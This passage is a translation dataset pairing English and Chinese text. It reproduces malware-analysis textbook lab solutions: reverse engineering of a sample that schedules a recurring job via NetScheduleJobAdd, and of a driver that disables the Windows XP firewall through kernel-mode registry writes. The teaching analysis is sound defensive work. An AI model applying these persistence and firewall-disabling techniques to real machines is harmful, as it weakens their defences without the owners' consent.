  zh: '**Lab 9-3 解答**'
- en: '***Short Answers***'
  id: totrans-2415
  prefs: []
  type: TYPE_NORMAL
  zh: '***简答***'
- en: 1\.
  id: totrans-2416
  prefs: []
  type: TYPE_NORMAL
  zh: '1.'
- en: The import table contains *kernel32.dll*, *NetAPI32.dll*, *DLL1.dll*, and *DLL2.dll*.
    The malware dynamically loads *user32.dll* and *DLL3.dll*.
  id: totrans-2417
  prefs: []
  type: TYPE_NORMAL
  zh: 导入表包含 *kernel32.dll*、*NetAPI32.dll*、*DLL1.dll* 和 *DLL2.dll*。恶意软件动态加载 *user32.dll*
    和 *DLL3.dll*。
- en: 2\.
  id: totrans-2418
  prefs: []
  type: TYPE_NORMAL
  zh: '2.'
- en: 'All three DLLs request the same base address: 0x10000000\.'
  id: totrans-2419
  prefs: []
  type: TYPE_NORMAL
  zh: 所有三个 DLL 请求相同的基址：0x10000000。
- en: 3\.
  id: totrans-2420
  prefs: []
  type: TYPE_NORMAL
  zh: '3.'
- en: '*DLL1.dll* is loaded at 0x10000000, *DLL2.dll* is loaded at 0x320000, and *DLL3.dll*
    is loaded at 0x380000 (this may be slightly different on your machine).'
  id: totrans-2421
  prefs: []
  type: TYPE_NORMAL
  zh: '*DLL1.dll* 被加载在 0x10000000，*DLL2.dll* 被加载在 0x320000，*DLL3.dll* 被加载在 0x380000（在您的机器上可能会有所不同）。'
- en: 4\.
  id: totrans-2422
  prefs: []
  type: TYPE_NORMAL
  zh: '4.'
- en: DLL1Print is called, and it prints “DLL 1 mystery data,” followed by the contents
    of a global variable.
  id: totrans-2423
  prefs: []
  type: TYPE_NORMAL
  zh: 调用 DLL1Print，并打印“DLL 1 神秘数据”，然后是全局变量的内容。
- en: 5\.
  id: totrans-2424
  prefs: []
  type: TYPE_NORMAL
  zh: '5.'
- en: DLL2ReturnJ returns a filename of *temp.txt* which is passed to the call to
    WriteFile.
  id: totrans-2425
  prefs: []
  type: TYPE_NORMAL
  zh: DLL2ReturnJ 返回一个 *temp.txt* 文件名，该文件名传递给 WriteFile 的调用。
- en: '**9**'
  id: totrans-2426
  prefs: []
  type: TYPE_NORMAL
  zh: '**9**'
- en: 6\.
  id: totrans-2427
  prefs: []
  type: TYPE_NORMAL
  zh: '6.'
- en: '*Lab09-03.exe* gets the buffer for the call to NetScheduleJobAdd from DLL3GetStructure,
    which it dynamically resolves.'
  id: totrans-2428
  prefs: []
  type: TYPE_NORMAL
  zh: '*Lab09-03.exe* 从 DLL3GetStructure 获取对 NetScheduleJobAdd 调用的缓冲区，它动态解析。'
- en: 7\.
  id: totrans-2429
  prefs: []
  type: TYPE_NORMAL
  zh: '7.'
- en: Mystery data 1 is the current process identifier, mystery data 2 is the handle
    to the open *temp.txt* file, and mystery data 3 is the location in memory of the
    string ping www.malwareanalysisbook.com.
  id: totrans-2430
  prefs: []
  type: TYPE_NORMAL
  zh: 神秘数据 1 是当前进程标识符，神秘数据 2 是打开的 *temp.txt* 文件的句柄，神秘数据 3 是字符串 ping www.malwareanalysisbook.com
    在内存中的位置。
- en: 8\.
  id: totrans-2431
  prefs: []
  type: TYPE_NORMAL
  zh: '8.'
- en: Select Manual Load when loading the DLL with IDA Pro, and then type the new
    image base address when prompted. In this case, the address is 0x320000\.
  id: totrans-2432
  prefs: []
  type: TYPE_NORMAL
  zh: 在 IDA Pro 中加载 DLL 时选择手动加载，然后根据提示输入新的图像基址。在这种情况下，地址是 0x320000。
- en: '***Detailed Analysis***'
  id: totrans-2433
  prefs: []
  type: TYPE_NORMAL
  zh: '***详细分析***'
- en: We start by examining the import table of *Lab09-03.exe* and it contains *kernel32.dll*,
    *NetAPI32.dll*, *DLL1.dll*, and *DLL2.dll*. Next, we load *Lab09-03.exe* into
    IDA Pro. We look for calls to LoadLibrary and check which strings are pushed on
    the stack before the call. We see two cross-references to LoadLibrary that push
    *user32.dll* and *DLL3.dll* respectively, so that these DLLs may be loaded dynamically
    during runtime.
  id: totrans-2434
  prefs: []
  type: TYPE_NORMAL
  zh: 我们首先检查 *Lab09-03.exe* 的导入表，它包含 *kernel32.dll*、*NetAPI32.dll*、*DLL1.dll* 和 *DLL2.dll*。接下来，我们将
    *Lab09-03.exe* 加载到 IDA Pro 中。我们寻找对 LoadLibrary 的调用，并检查在调用之前推送到栈上的字符串。我们看到两个对 LoadLibrary
    的交叉引用，分别推送 *user32.dll* 和 *DLL3.dll*，因此这些 DLL 可能会在运行时动态加载。
- en: We can check the base address requested by the DLLs by using PEview, as shown
    in Figure 9-10L. After loading *DLL1.dll* into PEview, click the IMAGE_OPTIONAL_HEADER
    and look at the value of Image Base, as shown at  in the figure. We repeat this
    process with *DLL2.dll* and *DLL3.dll*, and see that they all request a base address
    of 0x10000000\.
  id: totrans-2435
  prefs: []
  type: TYPE_NORMAL
  zh: 我们可以使用PEview检查DLL请求的基本地址，如图9-10L所示。将DLL1.dll加载到PEview后，点击IMAGE_OPTIONAL_HEADER并查看Image
    Base的值，如图中的所示。我们用DLL2.dll和DLL3.dll重复此过程，并看到它们都请求基本地址0x10000000。
- en: '*Figure 9-10L: Finding the requested base address with PEview* Solutions to
    Labs'
  id: totrans-2436
  prefs: []
  type: TYPE_NORMAL
  zh: '*图9-10L：使用PEview查找请求的基本地址* 实验室解决方案'
- en: '**545**'
  id: totrans-2437
  prefs: []
  type: TYPE_NORMAL
  zh: '**545**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-2438
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '![Image 123](index-579_1.png)'
  id: totrans-2439
  prefs: []
  type: TYPE_IMG
  zh: '![Image 123](index-579_1.png)'
- en: '**Using the Memory Map to Locate DLLs**'
  id: totrans-2440
  prefs: []
  type: TYPE_NORMAL
  zh: '**使用内存映射定位DLLs**'
- en: Next, we want to figure out at which memory address the three DLLs are loaded
    during runtime. *DLL1.dll* and *DLL2.dll* are loaded immediately because they’re
    in the import table. Since *DLL3.dll* is loaded dynamically, we will need to run
    the LoadLibrary function located at 0x401041\. We can do this by loading *Lab09-03.exe*
    into OllyDbg, setting a breakpoint at 0x401041, and clicking play. Once the breakpoint
    hits, we can step over the call to LoadLibrary. At this point, all three DLLs
    are loaded into *Lab09-03.exe*.
  id: totrans-2441
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们想找出在运行时三个DLL加载到的内存地址。DLL1.dll和DLL2.dll立即加载，因为它们在导入表中。由于DLL3.dll是动态加载的，我们需要运行位于0x401041的LoadLibrary函数。我们可以通过将Lab09-03.exe加载到OllyDbg中，在0x401041处设置断点，并点击播放来实现。一旦断点命中，我们可以跳过对LoadLibrary的调用。此时，所有三个DLL都已加载到Lab09-03.exe中。
- en: We bring up the memory map by selecting **View****Memory**. The memory map
    is shown in Figure 9-11L (it may appear slightly different on your machine). At
    , we see that *DLL1.dll* gets its preferred base address of 0x10000000\. At ,
    we see that *DLL2.dll* didn’t get its preferred base address because *DLL1.dll*
    was already loaded at that location, so *DLL2.dll* is loaded at 0x320000\. Finally,
    at , we see that *DLL3.dll* is loaded at 0x380000\.
  id: totrans-2442
  prefs: []
  type: TYPE_NORMAL
  zh: 我们通过选择**视图****内存**来显示内存映射。内存映射如图9-11L所示（在您的机器上可能略有不同）。在处，我们看到DLL1.dll获得了其首选基本地址0x10000000。在处，我们看到DLL2.dll没有获得其首选基本地址，因为DLL1.dll已经加载在那个位置，所以DLL2.dll加载在0x320000。最后，在处，我们看到DLL3.dll加载在0x380000。
- en: '*Figure 9-11L: Using the OllyDbg memory map*'
  id: totrans-2443
  prefs: []
  type: TYPE_NORMAL
  zh: '*图9-11L：使用OllyDbg内存映射*'
- en: '*to examine DLL load locations*'
  id: totrans-2444
  prefs: []
  type: TYPE_NORMAL
  zh: '*检查DLL加载位置*'
- en: Listing 9-9L shows the calls to the exports of *DLL1.dll* and *DLL2.dll*.
  id: totrans-2445
  prefs: []
  type: TYPE_NORMAL
  zh: 列表9-9L显示了从Lab09-03.exe调用DLL1.dll和DLL2.dll的导出函数。
- en: 00401006 call ds:**DLL1Print**
  id: totrans-2446
  prefs: []
  type: TYPE_NORMAL
  zh: 00401006 调用 ds:**DLL1Print**
- en: 0040100C call ds:**DLL2Print**
  id: totrans-2447
  prefs: []
  type: TYPE_NORMAL
  zh: 0040100C 调用 ds:**DLL2Print**
- en: 00401012 call ds:**DLL2ReturnJ**
  id: totrans-2448
  prefs: []
  type: TYPE_NORMAL
  zh: 00401012 调用 ds:**DLL2ReturnJ**
- en: 00401018 mov [ebp+hObject], eax 
  id: totrans-2449
  prefs: []
  type: TYPE_NORMAL
  zh: 00401018 mov [ebp+hObject], eax 
- en: 0040101B push 0 ; lpOverlapped 0040101D lea eax, [ebp+NumberOfBytesWritten]
  id: totrans-2450
  prefs: []
  type: TYPE_NORMAL
  zh: 0040101B push 0 ; lpOverlapped 0040101D lea eax, [ebp+NumberOfBytesWritten]
- en: 00401020 push eax ; lpNumberOfBytesWritten 00401021 push 17h ; nNumberOfBytesToWrite
    00401023 push offset aMalwareanalysi ; "malwareanalysisbook.com"
  id: totrans-2451
  prefs: []
  type: TYPE_NORMAL
  zh: 00401020 push eax ; lpNumberOfBytesWritten 00401021 push 17h ; nNumberOfBytesToWrite
    00401023 push offset aMalwareanalysi ; "malwareanalysisbook.com"
- en: 00401028 mov ecx, [ebp+hObject]
  id: totrans-2452
  prefs: []
  type: TYPE_NORMAL
  zh: 00401028 mov ecx, [ebp+hObject]
- en: 0040102B push ecx 
  id: totrans-2453
  prefs: []
  type: TYPE_NORMAL
  zh: 0040102B push ecx 
- en: ; hFile
  id: totrans-2454
  prefs: []
  type: TYPE_NORMAL
  zh: ; hFile
- en: 0040102C call ds:**WriteFile**
  id: totrans-2455
  prefs: []
  type: TYPE_NORMAL
  zh: 0040102C 调用 ds:**WriteFile**
- en: '*Listing 9-9L: Calls to the exports of* DLL1.dll *and* DLL2.dll *from* Lab09-03.exe
    At the start of Listing 9-9L, we see a call to DLL1Print, which is an export of
    *DLL1.dll*. We disassemble *DLL1.dll* with IDA Pro and see that the function prints
    “DLL 1 mystery data,” followed by the contents of a global variable, dword_10008030\.
    If we examine the cross-references to dword_10008030, we see that it is accessed
    in DllMain when the return value from the call **546**'
  id: totrans-2456
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表9-9L：从Lab09-03.exe调用DLL1.dll和DLL2.dll的导出函数* 在列表9-9L的开始处，我们看到对DLL1Print的调用，它是DLL1.dll的导出函数。我们使用IDA
    Pro反汇编DLL1.dll，看到该函数打印“DLL 1神秘数据”，然后是全局变量dword_10008030的内容。如果我们检查dword_10008030的交叉引用，我们看到它在DllMain调用时被访问，返回值**546**'
- en: Appendix C
  id: totrans-2457
  prefs: []
  type: TYPE_NORMAL
  zh: 附录C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-2458
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: GetCurrentProcessId is moved into it. Therefore, we can conclude that DLL1Print
    prints the current process ID, which it determines when the DLL is first loaded
    into the process.
  id: totrans-2459
  prefs: []
  type: TYPE_NORMAL
  zh: GetCurrentProcessId被移动到其中。因此，我们可以得出结论，DLL1Print打印当前进程ID，这是它在DLL首次加载到进程时确定的。
- en: 'In Listing 9-9L, we see calls to two exports from *DLL2.dll*: DLL2Print and
    DLL2ReturnJ. We can disassemble *DLL2.dll* with IDA Pro and examine DLL2Print
    to see that it prints “DLL 2 mystery data,” followed by the contents of a global
    variable, dword_1000B078\. If we examine the cross-references to dword_1000B078,
    we see that it is accessed in DllMain when the handle to CreateFileA is moved
    into it. The CreateFileA function opens a file handle to *temp.txt*, which the
    function creates if it doesn’t already exist. DLL2Print apparently prints the
    value of the handle for *temp.txt*. We can look at the DLL2ReturnJ export and
    find that it returns the same handle that DLL2Print prints. Further in Listing
    9-9L, at , the handle is moved into hObject, which is passed to WriteFile at
     defining where malwareanalysisbook.com is written.'
  id: totrans-2460
  prefs: []
  type: TYPE_NORMAL
  zh: 在列表 9-9L 中，我们看到对 *DLL2.dll* 的两个导出函数的调用：DLL2Print 和 DLL2ReturnJ。我们可以使用 IDA Pro
    反汇编 *DLL2.dll* 并检查 DLL2Print，以看到它打印“DLL 2 mystery data”，然后是全局变量 dword_1000B078
    的内容。如果我们检查 dword_1000B078 的交叉引用，我们会看到它在 DllMain 中被访问，当 CreateFileA 的句柄移动到其中时。CreateFileA
    函数打开一个文件句柄到 *temp.txt*，如果它不存在，则创建该文件。DLL2Print 似乎打印了 *temp.txt* 的句柄值。我们可以查看 DLL2ReturnJ
    导出函数，发现它返回与 DLL2Print 打印的相同的句柄。在列表 9-9L 的进一步内容中，在  处，句柄被移动到 hObject，它被传递给 WriteFile
    在  定义了 malwareanalysisbook.com 的写入位置。
- en: After the WriteFile in *Lab09-03.exe*, *DLL3.dll* is loaded with a call to **9**
  id: totrans-2461
  prefs: []
  type: TYPE_NORMAL
  zh: 在 *Lab09-03.exe* 中的 WriteFile 操作之后，通过调用 **9** 加载了 *DLL3.dll*
- en: LoadLibrary, followed by the dynamic resolution of DLL3Print and DLL3GetStructure
    using GetProcAddress. First, it calls DLL3Print, which prints “DLL 3 mystery data,”
    followed by the contents of a global variable found at 0x1000B0C0\.
  id: totrans-2462
  prefs: []
  type: TYPE_NORMAL
  zh: LoadLibrary，然后使用 GetProcAddress 动态解析 DLL3Print 和 DLL3GetStructure。首先，它调用 DLL3Print，打印“DLL
    3 mystery data”，然后是位于 0x1000B0C0 的全局变量的内容。
- en: When we check the cross-references for the global variable, we see that it is
    initialized in DllMain to the string ping www.malwareanalysisbook.com, so the
    memory location of the string will again be printed. DLL3GetStructure appears
    to return a pointer to the global dword_1000B0A0, but it is unclear what data
    is in that location. DllMain appears to initialize some sort of structure at this
    location using data and the string. Since DLL3GetStructure sets a pointer to this
    structure, we will need to see how *Lab09-03.exe* uses the data to figure out
    the contents of the structure. Listing 9-10L shows the call to DLL3GetStructure
    at .
  id: totrans-2463
  prefs: []
  type: TYPE_NORMAL
  zh: 当我们检查全局变量的交叉引用时，我们看到它在 DllMain 中初始化为字符串 ping www.malwareanalysisbook.com，因此该字符串的内存位置将被再次打印。DLL3GetStructure
    似乎返回指向全局 dword_1000B0A0 的指针，但该位置中的数据不清楚。DllMain 似乎使用数据和字符串在这个位置初始化某种结构。由于 DLL3GetStructure
    设置了这个结构的指针，我们需要查看 *Lab09-03.exe* 如何使用数据来确定结构的详细内容。列表 9-10L 显示了 DLL3GetStructure
    的调用位置 。
- en: 00401071 lea edx, [ebp+Buffer]
  id: totrans-2464
  prefs: []
  type: TYPE_NORMAL
  zh: 00401071 将 [ebp+Buffer] 的值加载到 edx
- en: 00401074 push edx
  id: totrans-2465
  prefs: []
  type: TYPE_NORMAL
  zh: 00401074 将 edx 压入栈
- en: 00401075 call [ebp+var_10] 
  id: totrans-2466
  prefs: []
  type: TYPE_NORMAL
  zh: 00401075 调用 [ebp+var_10] 
- en: ; **DLL3GetStructure**
  id: totrans-2467
  prefs: []
  type: TYPE_NORMAL
  zh: ; **DLL3GetStructure**
- en: 00401078 add esp, 4
  id: totrans-2468
  prefs: []
  type: TYPE_NORMAL
  zh: 00401078 添加 esp, 4
- en: 0040107B lea eax, [ebp+JobId]
  id: totrans-2469
  prefs: []
  type: TYPE_NORMAL
  zh: 0040107B 将 [ebp+JobId] 的值加载到 eax
- en: 0040107E push eax ; JobId 0040107F mov ecx, [ebp+**Buffer**]
  id: totrans-2470
  prefs: []
  type: TYPE_NORMAL
  zh: 0040107E 将 eax 压入栈；JobId 0040107F 将 [ebp+**Buffer**] 的值移动到 ecx
- en: 00401082 push ecx ; Buffer 00401083 push 0 ; Servername 00401085 call **NetScheduleJobAdd**
  id: totrans-2471
  prefs: []
  type: TYPE_NORMAL
  zh: 00401082 将 ecx 压入栈；Buffer 00401083 将 0 压入栈；Servername 00401085 调用 **NetScheduleJobAdd**
- en: '*Listing 9-10L: Calls to DLL3GetStructure followed by NetScheduleJobAdd in*
    Lab09-03.exe It appears that the result of that call is the structure pointed
    to by Buffer, which is subsequently passed to NetScheduleJobAdd. Viewing the MSDN
    page for NetScheduleJobAdd tells us that Buffer is a pointer to an AT_INFO structure.'
  id: totrans-2472
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 9-10L：在 *Lab09-03.exe* 中 DLL3GetStructure 调用后跟随 NetScheduleJobAdd 调用。看起来该调用的结果是
    Buffer 指向的结构，随后传递给 NetScheduleJobAdd。查看 NetScheduleJobAdd 的 MSDN 页面告诉我们 Buffer
    是指向 AT_INFO 结构的指针。'
- en: '**Applying a Structure in IDA Pro**'
  id: totrans-2473
  prefs: []
  type: TYPE_NORMAL
  zh: '**在 IDA Pro 中应用结构**'
- en: The AT_INFO structure can be applied to the data in *DLL3.dll*. First, load
    *DLL3.dll* into IDA Pro, press the INSERT key within the Structures window, and
    add the standard structure AT_INFO. Next, go to dword_1000B0A0 in memory and Solutions
    to Labs
  id: totrans-2474
  prefs: []
  type: TYPE_NORMAL
  zh: AT_INFO 结构可以应用于 *DLL3.dll* 中的数据。首先，将 *DLL3.dll* 加载到 IDA Pro 中，在结构窗口中按 INSERT
    键，并添加标准结构 AT_INFO。然后，转到内存中的 dword_1000B0A0 并查看解决方案
- en: '**547**'
  id: totrans-2475
  prefs: []
  type: TYPE_NORMAL
  zh: '**547**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-2476
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: select **Edit****Struct Var** and click **AT_INFO**. This will cause the data
    to be more readable, as shown in Listing 9-11L. We can see that the scheduled
    job will be set to ping *malwareanalysisbook.com* every day of the week at 1:00
    AM.
  id: totrans-2477
  prefs: []
  type: TYPE_NORMAL
  zh: 选择 **编辑****结构变量**并点击 **AT_INFO**。这将使数据更易于阅读，如列表 9-11L 所示。我们可以看到，计划任务将被设置为每天凌晨
    1:00 AM ping *malwareanalysisbook.com*。
- en: 10001022 mov stru_1000B0A0.Command, offset WideCharStr ; "ping www..."
  id: totrans-2478
  prefs: []
  type: TYPE_NORMAL
  zh: 10001022 mov stru_1000B0A0.Command, offset WideCharStr ; "ping www..."
- en: 1000102C mov stru_1000B0A0.JobTime, 36EE80h
  id: totrans-2479
  prefs: []
  type: TYPE_NORMAL
  zh: 1000102C mov stru_1000B0A0.JobTime, 36EE80h
- en: 10001036 mov stru_1000B0A0.DaysOfMonth, 0
  id: totrans-2480
  prefs: []
  type: TYPE_NORMAL
  zh: 10001036 mov stru_1000B0A0.DaysOfMonth, 0
- en: 10001040 mov stru_1000B0A0.DaysOfWeek, 7Fh
  id: totrans-2481
  prefs: []
  type: TYPE_NORMAL
  zh: 10001040 mov stru_1000B0A0.DaysOfWeek, 7Fh
- en: 10001047 mov stru_1000B0A0.Flags, 11h
  id: totrans-2482
  prefs: []
  type: TYPE_NORMAL
  zh: 10001047 mov stru_1000B0A0.Flags, 11h
- en: '*Listing 9-11L: AT_INFO Structure*'
  id: totrans-2483
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 9-11L：AT_INFO 结构*'
- en: '**Specifying a New Image Base with IDA Pro**'
  id: totrans-2484
  prefs: []
  type: TYPE_NORMAL
  zh: '**使用 IDA Pro 指定新图像基址**'
- en: We can load *DLL2.dll* into IDA Pro in a different location by checking the
    **Manual Load** box when loading the DLL. In the field that says **Please specify**
    **the new image base**, we type **320000**. IDA Pro will do the rest to adjust
    all of the offsets, just as OllyDbg did when loading the DLL.
  id: totrans-2485
  prefs: []
  type: TYPE_NORMAL
  zh: 我们可以通过在加载 DLL 时勾选 **手动加载** 复选框，将 *DLL2.dll* 加载到 IDA Pro 的不同位置。在显示 **请指定** **新图像基址**
    的字段中，我们输入 **320000**。IDA Pro 将完成其余工作以调整所有偏移量，就像 OllyDbg 加载 DLL 时所做的那样。
- en: '**Malware Summary**'
  id: totrans-2486
  prefs: []
  type: TYPE_NORMAL
  zh: '**恶意软件摘要**'
- en: 'This lab demonstrated how to determine where three DLLs are loaded into *Lab09-03.exe*
    using OllyDbg. We loaded these DLLs into IDA Pro to perform full analysis, and
    then figured out the mystery data printed by the malware: mystery data 1 is the
    current process identifier, mystery data 2 is the handle to the open *temp.txt*,
    and mystery data 3 is the location in memory of the string ping www.malwareanalysisbook.com.
    Finally, we applied the Windows AT_INFO structure within IDA Pro to aid our analysis
    of *DLL3.dll*.'
  id: totrans-2487
  prefs: []
  type: TYPE_NORMAL
  zh: 本实验演示了如何使用 OllyDbg 确定三个 DLL 被加载到 *Lab09-03.exe* 的位置。我们将这些 DLL 加载到 IDA Pro 中进行完整分析，然后找出恶意软件打印的神秘数据：神秘数据
    1 是当前进程标识符，神秘数据 2 是打开的 *temp.txt* 的句柄，神秘数据 3 是字符串 ping www.malwareanalysisbook.com
    在内存中的位置。最后，我们应用了 IDA Pro 中的 Windows AT_INFO 结构来帮助我们分析 *DLL3.dll*。
- en: '**Lab 10-1 Solutions**'
  id: totrans-2488
  prefs: []
  type: TYPE_NORMAL
  zh: '**Lab 10-1 解决方案**'
- en: '***Short Answers***'
  id: totrans-2489
  prefs: []
  type: TYPE_NORMAL
  zh: '***简答题***'
- en: 1\.
  id: totrans-2490
  prefs: []
  type: TYPE_NORMAL
  zh: '1.'
- en: If you run procmon to monitor this program, you will see that the only call
    to write to the registry is to RegSetValue for the value HKLM\SOFTWARE\ Microsoft\Cryptography\RNG\Seed.
    Some indirect changes are made by the calls to CreateServiceA, but this program
    also makes direct changes to the registry from the kernel that go undetected by
    procmon.
  id: totrans-2491
  prefs: []
  type: TYPE_NORMAL
  zh: 如果您使用 procmon 监控此程序，您将看到唯一的写入注册表的调用是 RegSetValue 对 HKLM\SOFTWARE\ Microsoft\Cryptography\RNG\Seed
    的值。通过 CreateServiceA 的调用进行了一些间接更改，但此程序还从内核直接更改注册表，这些更改不会被 procmon 检测到。
- en: 2\.
  id: totrans-2492
  prefs: []
  type: TYPE_NORMAL
  zh: '2.'
- en: To set a breakpoint to see what happens in the kernel, you must open the executable
    within an instance of WinDbg running in the virtual machine, while also debugging
    the kernel with another instance of WinDbg in the host machine. When *Lab10-01.exe*
    is stopped in the virtual machine, you first use the !drvobj command to get a
    handle to the driver object, which contains a pointer to the unload function.
    Next, you can set a breakpoint on the unload function within the driver. The breakpoint
    will be triggered when you restart *Lab10-01.exe*.
  id: totrans-2493
  prefs: []
  type: TYPE_NORMAL
  zh: 要设置断点以查看内核中的操作，您必须在虚拟机中运行的 WinDbg 实例中打开可执行文件，同时使用主机机器上的另一个 WinDbg 实例调试内核。当 *Lab10-01.exe*
    在虚拟机中停止时，您首先使用 !drvobj 命令获取驱动程序对象的句柄，该句柄包含指向卸载函数的指针。接下来，您可以在驱动程序中的卸载函数上设置断点。当您重新启动
    *Lab10-01.exe* 时，断点将被触发。
- en: 3\.
  id: totrans-2494
  prefs: []
  type: TYPE_NORMAL
  zh: '3.'
- en: This program creates a service to load a driver. The driver code then creates
    (or modifies, if they exist) the registry keys \Registry\Machine\ SOFTWARE\Policies\Microsoft\WindowsFirewall\StandardProfile
    and **548**
  id: totrans-2495
  prefs: []
  type: TYPE_NORMAL
  zh: 此程序创建一个服务来加载驱动程序。然后驱动程序代码创建（如果存在则修改）注册表键 \Registry\Machine\ SOFTWARE\Policies\Microsoft\WindowsFirewall\StandardProfile
    和 **548**
- en: Appendix C
  id: totrans-2496
  prefs: []
  type: TYPE_NORMAL
  zh: 附录 C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-2497
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: \Registry\Machine\SOFTWARE\Policies\Microsoft\WindowsFirewall\DomainProfile.
  id: totrans-2498
  prefs: []
  type: TYPE_NORMAL
  zh: \Registry\Machine\SOFTWARE\Policies\Microsoft\WindowsFirewall\DomainProfile.
- en: Setting these registry keys disables the Windows XP firewall.
  id: totrans-2499
  prefs: []
  type: TYPE_NORMAL
  zh: 设置这些注册表键将禁用 Windows XP 防火墙。
- en: '***Detailed Analysis***'
  id: totrans-2500
  prefs: []
  type: TYPE_NORMAL
  zh: '***详细分析***'
- en: We begin with some basic static analysis. Examining the executable, we see very
    few imports other than the standard ones included with every executable. The imports
    of interest are OpenSCManagerA, OpenServiceA, ControlService, StartServiceA, and
    CreateServiceA. These indicate the program creates a service, and probably starts
    and manipulates that service. There appears to be little additional interaction
    with the system.
  id: totrans-2501
  prefs: []
  type: TYPE_NORMAL
  zh: 我们从一些基本的静态分析开始。检查可执行文件，我们看到除了每个可执行文件都包含的标准导入之外，几乎没有其他导入。感兴趣的导入是 OpenSCManagerA、OpenServiceA、ControlService、StartServiceA
    和 CreateServiceA。这表明程序创建了一个服务，并且可能启动并操作该服务。似乎与系统的交互很少。
- en: The strings output reveals a few interesting strings. The first is C:\Windows\
    System32\Lab10-01.sys, which suggests that *Lab10-01.sys* probably contains the
    code for the service.
  id: totrans-2502
  prefs: []
  type: TYPE_NORMAL
  zh: 输出的字符串揭示了一些有趣的信息。第一个是 C:\Windows\System32\Lab10-01.sys，这表明 *Lab10-01.sys* 可能包含服务的代码。
- en: Examining the driver file, we see that it imports only three functions.
  id: totrans-2503
  prefs: []
  type: TYPE_NORMAL
  zh: 检查驱动文件，我们看到它只导入了三个函数。
- en: The first function is KeTickCount, which is included in almost every driver
    and can be ignored. The two remaining functions, RtlCreateRegistryKey and RtlWriteRegistryValue,
    tell us that the driver probably accesses the registry.
  id: totrans-2504
  prefs: []
  type: TYPE_NORMAL
  zh: 第一个函数是 KeTickCount，它几乎包含在每个驱动程序中，可以忽略。剩下的两个函数，RtlCreateRegistryKey 和 RtlWriteRegistryValue，告诉我们驱动程序可能访问注册表。
- en: '**10**'
  id: totrans-2505
  prefs: []
  type: TYPE_NORMAL
  zh: '**10**'
- en: 'The driver file also contains a number of interesting strings, as follows:
    EnableFirewall'
  id: totrans-2506
  prefs: []
  type: TYPE_NORMAL
  zh: 驱动文件还包含许多有趣的字符串，如下所示：EnableFirewall
- en: \Registry\Machine\SOFTWARE\Policies\Microsoft\WindowsFirewall\StandardProfile
  id: totrans-2507
  prefs: []
  type: TYPE_NORMAL
  zh: \Registry\Machine\SOFTWARE\Policies\Microsoft\WindowsFirewall\StandardProfile
- en: \Registry\Machine\SOFTWARE\Policies\Microsoft\WindowsFirewall\DomainProfile
  id: totrans-2508
  prefs: []
  type: TYPE_NORMAL
  zh: \Registry\Machine\SOFTWARE\Policies\Microsoft\WindowsFirewall\DomainProfile
- en: \Registry\Machine\SOFTWARE\Policies\Microsoft\WindowsFirewall
  id: totrans-2509
  prefs: []
  type: TYPE_NORMAL
  zh: \Registry\Machine\SOFTWARE\Policies\Microsoft\WindowsFirewall
- en: \Registry\Machine\SOFTWARE\Policies\Microsoft
  id: totrans-2510
  prefs: []
  type: TYPE_NORMAL
  zh: \Registry\Machine\SOFTWARE\Policies\Microsoft
- en: These strings look a lot like registry keys, except that they start with
  id: totrans-2511
  prefs: []
  type: TYPE_NORMAL
  zh: 这些字符串看起来非常像注册表键，但它们以
- en: \Registry\Machine, instead of one of the usual registry root keys, such as HKLM.
  id: totrans-2512
  prefs: []
  type: TYPE_NORMAL
  zh: \Registry\Machine, 而不是通常的注册表根键之一，例如 HKLM。
- en: When accessing the registry from the kernel, the prefix \Registry\Machine is
    equivalent to accessing HKEY_LOCAL_MACHINE from a user-space program. An Internet
    search reveals that setting the EnableFirewall value to 0 disables the built-in
    Windows XP firewall.
  id: totrans-2513
  prefs: []
  type: TYPE_NORMAL
  zh: 当从内核访问注册表时，前缀 \Registry\Machine 等同于从用户空间程序访问 HKEY_LOCAL_MACHINE。网络搜索显示将 EnableFirewall
    值设置为 0 将禁用内置的 Windows XP 防火墙。
- en: 'Since these strings suggest that the malware writes to the registry, we open
    procmon to test our hypothesis. This shows several calls to functions that read
    the registry, but only one call to write to the registry: RegSetValue on the value
    HKLM\SOFTWARE\Microsoft\Cryptography\RNG\Seed. This registry value is changed
    all the time and is meaningless for malware analysis, but since kernel code is
    involved, we need to make sure that the driver isn’t modifying the registry covertly.'
  id: totrans-2514
  prefs: []
  type: TYPE_NORMAL
  zh: 由于这些字符串表明恶意软件会写入注册表，我们打开 procmon 来测试我们的假设。这显示了对读取注册表的几个函数调用，但只有一个调用写入注册表：在 HKLM\SOFTWARE\Microsoft\Cryptography\RNG\Seed
    上的 RegSetValue。这个注册表值经常更改，对恶意软件分析没有意义，但由于涉及内核代码，我们需要确保驱动程序没有秘密修改注册表。
- en: Next, we open the executable, navigate to the main function shown in Listing
    10-1L, and see that it makes only four function calls.
  id: totrans-2515
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们打开可执行文件，导航到第 10-1L 列表中显示的主函数，我们看到它只进行了四个函数调用。
- en: 00401004 push 0F003Fh ; dwDesiredAccess
  id: totrans-2516
  prefs: []
  type: TYPE_NORMAL
  zh: 00401004 push 0F003Fh ; dwDesiredAccess
- en: 00401009 push 0 ; lpDatabaseName
  id: totrans-2517
  prefs: []
  type: TYPE_NORMAL
  zh: 00401009 push 0 ; lpDatabaseName
- en: 0040100B push 0 ; lpMachineName
  id: totrans-2518
  prefs: []
  type: TYPE_NORMAL
  zh: 0040100B push 0 ; lpMachineName
- en: 0040100D call ds:OpenSCManagerA ; Establish a connection to the service 0040100D
  id: totrans-2519
  prefs: []
  type: TYPE_NORMAL
  zh: 0040100D call ds:OpenSCManagerA ; 建立与服务的连接 0040100D
- en: ; control manager on the specified computer
  id: totrans-2520
  prefs: []
